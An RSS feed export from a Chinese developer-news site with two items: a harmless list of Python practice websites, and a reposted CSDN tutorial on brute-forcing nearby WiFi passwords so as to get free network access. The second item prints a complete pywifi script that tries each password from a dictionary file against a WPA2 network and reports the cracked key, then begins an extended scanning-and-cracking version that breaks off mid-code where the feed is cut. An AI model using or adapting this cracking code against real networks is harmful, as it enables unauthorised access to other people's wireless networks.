<?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
            <channel>
            <title>开发者头条</title>
            <link>http://toutiao.io/</link>
            <description></description>
<item>
<guid>f36ab1bc56efda42147cf1448f96ea5a</guid>
<title>知乎高赞！有没有适合新手练习 Python 的做题类网站？</title>
<link>https://toutiao.io/k/th5mczx</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;p id=&quot;js_tags&quot; class=&quot;article-tag__list single-tag__wrp js_single js_wx_tap_highlight wx_tap_card&quot; data-len=&quot;1&quot; role=&quot;link&quot; aria-labelledby=&quot;js_article-tag-card__left js_a11y_comma js_article-tag-card__right&quot;&gt;
                                            
                                                                                    &lt;span aria-hidden=&quot;true&quot; id=&quot;js_article-tag-card__left&quot; class=&quot;article-tag-card__left&quot;&gt;
                                    &lt;span class=&quot;article-tag-card__title&quot;&gt;收录于话题&lt;/span&gt;
                                    &lt;span class=&quot;article-tag__item-wrp no-active js_tag&quot; data-url=&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzU3Mzk1ODA5OQ==&amp;amp;action=getalbum&amp;amp;album_id=2212614638188429318#wechat_redirect&quot; data-tag_id=&quot;&quot; data-album_id=&quot;2212614638188429318&quot; data-tag_source=&quot;4&quot;&gt;
                                        &lt;span class=&quot;article-tag__item&quot;&gt;#Python&lt;/span&gt;
                                    &lt;/span&gt;
                                &lt;/span&gt;
                                &lt;span aria-hidden=&quot;true&quot; id=&quot;js_article-tag-card__right&quot; class=&quot;article-tag-card__right&quot;&gt;13个&lt;/span&gt;
                                                                                        &lt;/p&gt;

                
                                
                
                

                
                                                                

                
                                


                
                
                
                
                                                
                                                                
                                
                                
                
                &lt;div class=&quot;rich_media_content &quot; id=&quot;js_content&quot;&gt;
                    

                    
                    
                    
                    &lt;section class=&quot;mp_profile_iframe_wrp&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzU3Mzk1ODA5OQ==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIpUwwib3ughYzyRWGgnRezhFgwicOtsUTHoYCGlVibuic6LN0mUYjVJ3jP9W5zvwwyhdrNJEqOv8X9QSQ/0?wx_fmt=png&quot; data-nickname=&quot;Python小二&quot; data-alias=&quot;pythonXE&quot; data-signature=&quot;回复1024免费领100+Python经典实战项目＆数据分析入门手册&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;本文整理自我的知乎回答，地址：&lt;code&gt;https://www.zhihu.com/question/442492817/answer/2333418261&lt;/code&gt;。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;1. LeetCode&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;LeetCode 是一个刷算法题的网站，里面有多种语言可选 ，题目分为简单、中等和困难三个级别，可以根据自己的水平进行选择，想进大厂的话，这可能是必不可少的一关。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5859197577592733&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ng55l8L54cSWczNoBOsDTibAvmNuChj5sLMAwhPsqfYiavE99UkWibGtGjw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1321&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;网址：&lt;code&gt;https://leetcode-cn.com/problemset/all&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;2. PythonTip&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;PythonTip 里面的练习题主要偏向 Python 基础和一些基础的算法，比较适合作为新手的入门练习题。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5127245508982036&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ngVdicKdGNFykZnUHuPRPV3B85IpicdHuG4Lcwn9fXHfAicaKD3zcKueYDA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1336&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;网址：&lt;code&gt;http://www.pythontip.com/coding/code_oj&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;3. Coding Games&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;一边玩游戏，一边挑战编程难题。Coding games 支持包括 Python、Java、C 在内的 20 多种编程语言。用户界面功能强大，可以定制。例如，你可以选择你的代码编辑器的风格：Emacs、Vim、Classic。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果你想提升编程技能，玩 Coding games 是一种有趣的途径。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.48850881881346875&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ngOTHaGrK2NYNQlZU6WNUId1uWsWuCAdaWPuXe63p8SwTEE3nqXJAFVg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1871&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;网址：&lt;code&gt;http://www.codingame.com&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;4. CodeCombat&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;CodeCombat 是一款网页编程游戏。这款编程游戏借鉴了游戏的很多设计元素，游戏剧情十分丰富。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;CodeCombat 能够学习 Python 等多种语言，这些语言能够运用到游戏设计、网页应用、App 的开发上。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.4705263157894737&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ngG93KeVDk4DHFBWVj80eAVKAh2dwLjoOw4YDuPmqiaqibtHk41D6ZH35g/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1900&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;codecombat 教学版网址：&lt;code&gt;https://koudashijie.com&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;5. Checkio&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Check iO 是一个基于浏览器的游戏，你需要使用 Python 或 JavaScript 来解决问题才能将游戏进行下去（需要登录）。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.619535519125683&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ngsUqdCibb895HWwPibg3MC7mF6gj0qBdunhNg9z4WcIDgkiaGID8sXppxQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1464&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;网址：&lt;code&gt;http://checkio.org&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;6. Cyber Dojo&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Cyber-dojo 是一个提供给程序员们练习写程序的地方。支持 Python、JavaScript、Java、PHP、Ruby 等语言。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.6236111111111111&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ngARic3cJsjrRwDhnJJN6cQo87wrEPKIrSMKCz7z7jkC2ekVVzz67ktUw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;720&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;网址：&lt;code&gt;http://www.cyber-dojo.org&lt;/code&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;源代码：&lt;code&gt;https://github.com/JonJagger/cyber-dojo&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;7. Code Monkey&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;CodeMonkey 是一款非常富有童趣的网页编程游戏，玩家通过编程向怪兽小猴子传达指令，帮助小猴子吃到香蕉就可以过关了。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;CodeMonkey 以游戏闯关的方式进行教学，总共有 300 多个关卡，涉及到编程的各种概念。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.35835995740149096&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ngfWp2vbmz6sS0BXnr74vWCiclXyHMzBtLSJ7SicJ1ibibpReejYT7VYkyQQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1878&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;网址：&lt;code&gt;http://www.playcodemonkey.com&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;8. Codewars&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在战斗中进行学习，和其他人一起在真实的编程挑战中提升技巧，支持 Python、JavaScript、C#、Java、Python 等语言（支持的语言见下图）。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.39646869983948635&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ngAB8ibictH9GG80s7WxndUZknMa2glgia3EfyXLuw8EPqfID7Fudo97aDw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1869&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;网址：&lt;code&gt;http://www.codewars.com&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;9. pythonchallenge&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这是一个非常有意思的 Python 游戏通关网站，每一关都需要利用 Python 知识解题找到答案，然后进入下一关。很考验对 Python 的综合掌握能力，比如有的闯关需要用到正则表达式，有的要用到爬虫。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们平常学 Python 都是按章节顺序、包或者模块来学，容易前学后忘。也常有同学说，我已经看完了编程教室的入门教程，但不知道可以做点什么。那么正好可以拿这个网站来综合测试一下对 Python 的掌握情况，以便查缺补漏。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7724601175482787&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PvP6qjUpvIrBsN8Lzh88GXD4N1Bnf8ng3GTGBAVOiaANwJX9brZgLicic1qeyLKjG0hz78aPrJbUl3xLw3icZ0EvibA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1191&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;网址：&lt;code&gt;http://www.pythonchallenge.com&lt;/code&gt;&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;10. Python100题&lt;/h2&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://mp.weixin.qq.com/s?__biz=MzU3Mzk1ODA5OQ==&amp;amp;mid=2247491678&amp;amp;idx=1&amp;amp;sn=85ee63d746b79a0177239169df1c1147&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;100 个 Pytho‍n 小例子（练习题）&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;&lt;strong&gt;100 个 Python 小例子（练习题）&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;&lt;strong&gt;&lt;span&gt;往期回顾：&lt;/span&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;/section&gt;
                &lt;/div&gt;

                

                



                
                &lt;div class=&quot;reward_qrcode_area reward_area tc&quot; id=&quot;js_reward_qrcode&quot;&gt;
                                &lt;p class=&quot;tips_global&quot; aria-hidden=&quot;true&quot; id=&quot;js_a11y_reward_qr_title&quot;&gt;Long-press QR code to transfer me a reward&lt;/p&gt;
                                                                &lt;p role=&quot;option&quot; aria-labelledby=&quot;js_a11y_reward_qr_word js_a11y_comma js_a11y_reward_qr_title js_a11y_reward_qr_money&quot; aria-describedby=&quot;js_a11y_reward_qr_tips &quot; class=&quot;reward_tips&quot; id=&quot;js_a11y_reward_qr_word&quot;&gt;分享|点赞|在看是最大的支持&lt;/p&gt;
                                &lt;span class=&quot;reward_qrcode_img_wrp&quot;&gt;&lt;img alt=&quot;赞赏二维码&quot; class=&quot;reward_qrcode_img&quot; id=&quot;js_reward_qrcode_img&quot;/&gt;&lt;/span&gt;
                                &lt;p aria-hidden=&quot;true&quot; id=&quot;js_a11y_reward_qr_tips&quot; class=&quot;tips_global&quot;&gt;As required by Apple&#x27;s new policy, the Reward feature has been disabled on Weixin for iOS. You can still reward an Official Account by transferring money via QR code.&lt;/p&gt;
                            &lt;/div&gt;
                                                                            
                              
            &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>e5dbe2ded88e357c0369209b2fae8488</guid>
<title>Python暴力破解附近局域网WiFi密码</title>
<link>https://toutiao.io/k/8lu2s3i</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;p id=&quot;js_tags&quot; class=&quot;article-tag__list single-tag__wrp js_single js_wx_tap_highlight wx_tap_card&quot; data-len=&quot;1&quot; role=&quot;link&quot; aria-labelledby=&quot;js_article-tag-card__left js_a11y_comma js_article-tag-card__right&quot;&gt;
                                            
                                                                                    &lt;span aria-hidden=&quot;true&quot; id=&quot;js_article-tag-card__left&quot; class=&quot;article-tag-card__left&quot;&gt;
                                    &lt;span class=&quot;article-tag-card__title&quot;&gt;收录于话题&lt;/span&gt;
                                    &lt;span class=&quot;article-tag__item-wrp no-active js_tag&quot; data-url=&quot;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzUyMzM2ODUwMA==&amp;amp;action=getalbum&amp;amp;album_id=1882178683738619906#wechat_redirect&quot; data-tag_id=&quot;&quot; data-album_id=&quot;1882178683738619906&quot; data-tag_source=&quot;4&quot;&gt;
                                        &lt;span class=&quot;article-tag__item&quot;&gt;#Python&lt;/span&gt;
                                    &lt;/span&gt;
                                &lt;/span&gt;
                                &lt;span aria-hidden=&quot;true&quot; id=&quot;js_article-tag-card__right&quot; class=&quot;article-tag-card__right&quot;&gt;44个&lt;/span&gt;
                                                                                        &lt;/p&gt;

                
                                
                
                

                
                                                                

                
                                


                
                
                
                
                                                
                                                                
                                
                                
                
                &lt;div class=&quot;rich_media_content &quot; id=&quot;js_content&quot;&gt;
                    

                    
                    
                    
                    &lt;section class=&quot;mp_profile_iframe_wrp&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzUyMzM2ODUwMA==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/hs540iaTKoaIWQB73gicJGTicpAjbSjAjic3d4ytEoiaArkWw6hKMqicPSXrpd4FquTTdStuMoILtqGHS222lIQlh1mg/0?wx_fmt=png&quot; data-nickname=&quot;逆锋起笔&quot; data-alias=&quot;readdot&quot; data-signature=&quot;全网最新编程视频教程、大佬们推荐的 pdf 学习资料，全部免费分享！来到这里，你不懂程序都难。&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;section&gt;&lt;span&gt;&lt;span&gt;‍&lt;/span&gt;来自：CSDN，作者：Tr0e&lt;br/&gt;&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;链接：https://blog.csdn.net/weixin_39190897/article/details/119778471&lt;/span&gt;&lt;/section&gt;&lt;/section&gt;&lt;h3&gt;&lt;span&gt;前言&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;本文将记录学习下如何通过 Python 脚本实现 WIFI 密码的暴力破解，从而实现免费蹭网。&lt;/section&gt;&lt;h3&gt;&lt;span&gt;无图形界面&lt;/span&gt;&lt;/h3&gt;&lt;section&gt;先来看看没有图形界面版的爆破脚本。&lt;/section&gt;&lt;h2&gt;&lt;span&gt;&lt;strong&gt;WIFI爆破&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;section class=&quot;code-snippet__fix code-snippet__js&quot;&gt;&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;python&quot;&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import pywififrom pywifi import constimport timeimport datetime# 测试连接，返回链接结果def wifiConnect(pwd):    # 抓取网卡接口    wifi = pywifi.PyWiFi()    # 获取第一个无线网卡    ifaces = wifi.interfaces()[0]    # 断开所有连接    ifaces.disconnect()    time.sleep(1)    wifistatus = ifaces.status()    if wifistatus == const.IFACE_DISCONNECTED:        # 创建WiFi连接文件        profile = pywifi.Profile()        # 要连接WiFi的名称        profile.ssid = &quot;Tr0e&quot;        # 网卡的开放状态        profile.auth = const.AUTH_ALG_OPEN        # wifi加密算法,一般wifi加密算法为wps        profile.akm.append(const.AKM_TYPE_WPA2PSK)        # 加密单元        profile.cipher = const.CIPHER_TYPE_CCMP        # 调用密码        profile.key = pwd        # 删除所有连接过的wifi文件        ifaces.remove_all_network_profiles()        # 设定新的连接文件        tep_profile = ifaces.add_network_profile(profile)        ifaces.connect(tep_profile)        # wifi连接时间        time.sleep(2)        if ifaces.status() == const.IFACE_CONNECTED:            return True        else:            return False    else:        print(&quot;已有wifi连接&quot;)# 读取密码本def readPassword():    success = False    print(&quot;****************** WIFI破解 ******************&quot;)    # 密码本路径    path = &quot;pwd.txt&quot;    # 打开文件    file = open(path, &quot;r&quot;)    start = datetime.datetime.now()    while True:        try:            pwd = file.readline()            # 去除密码的末尾换行符            pwd = pwd.strip(&#x27;\n&#x27;)            bool = wifiConnect(pwd)            if bool:                print(&quot;[*] 密码已破解：&quot;, pwd)                print(&quot;[*] WiFi已自动连接！！！&quot;)                success = True                break            else:                # 跳出当前循环，进行下一次循环                print(&quot;正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s&quot;%(&quot;Tr0e&quot;,pwd))        except:            continue    end = datetime.datetime.now()    if(success):        print(&quot;[*] 本次破解WIFI密码一共用了多长时间：{}&quot;.format(end - start))    else:        print(&quot;[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！&quot;)    exit(0)if __name__==&quot;__main__&quot;:    readPassword()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/section&gt;&lt;section&gt;&lt;br/&gt;&lt;/section&gt;&lt;section&gt;代码运行效果：&lt;br/&gt;&lt;img data-ratio=&quot;0.4882246376811594&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jy6xqzHf1icfluCMyt5kyMIHNJsTslxw3jsuYMT4ZKm0bw0zBUawSiaNSoVoAk050ldseW44znqqKqQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1104&quot;/&gt;&lt;/section&gt;&lt;h2&gt;&lt;span&gt;&lt;strong&gt;脚本优化&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;&lt;section&gt;以上脚本需内嵌 WIFI 名、爆破字典路径，缺少灵活性。下面进行改造优化：&lt;/section&gt;&lt;section class=&quot;code-snippet__fix code-snippet__js&quot;&gt;&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;python&quot;&gt;&lt;section&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import pywifi&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;import time&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;from pywifi import const&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# WiFi扫描模块&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;def wifi_scan():&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 初始化wifi&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    wifi = pywifi.PyWiFi()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 使用第一个无线网卡&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    interface = wifi.interfaces()[0]&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 开始扫描&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    interface.scan()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    for i in range(4):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        time.sleep(1)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        print(&#x27;\r扫描可用 WiFi 中，请稍后。。。（&#x27; + str(3 - i), end=&#x27;）&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    print(&#x27;\r扫描完成！\n&#x27; + &#x27;-&#x27; * 38)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    print(&#x27;\r{:4}{:6}{}&#x27;.format(&#x27;编号&#x27;, &#x27;信号强度&#x27;, &#x27;wifi名&#x27;))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    bss = interface.scan_results()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 存放wifi名的集合&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    wifi_name_set = set()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    for w in bss:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 解决乱码问题&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        wifi_name_and_signal = (100 + w.signal, w.ssid.encode(&#x27;raw_unicode_escape&#x27;).decode(&#x27;utf-8&#x27;))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        wifi_name_set.add(wifi_name_and_signal)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 存入列表并按信号排序&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    wifi_name_list = list(wifi_name_set)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    num = 0&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 格式化输出&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    while num &amp;lt; len(wifi_name_list):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        print(&#x27;\r{:&amp;lt;6d}{:&amp;lt;8d}{}&#x27;.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        num += 1&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    print(&#x27;-&#x27; * 38)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 返回wifi列表&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    return wifi_name_list&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;# WIFI破解模块&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;def wifi_password_crack(wifi_name):&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    # 字典路径&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    wifi_dic_path = input(&quot;请输入本地用于WIFI暴力破解的密码字典（txt格式，每个密码占据1行）的路径：&quot;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;    with open(wifi_dic_path, &#x27;r&#x27;) as f:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        # 遍历密码&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;        for pwd in f:&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 去除密码的末尾换行符&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            pwd = pwd.strip(&#x27;\n&#x27;)&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 创建wifi对象&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            wifi = pywifi.PyWiFi()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 创建网卡对象，为第一个wifi网卡&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            interface = wifi.interfaces()[0]&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 断开所有wifi连接&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            interface.disconnect()&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            # 等待其断开&lt;/span&gt;&lt;/code&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;            while interface.status() == 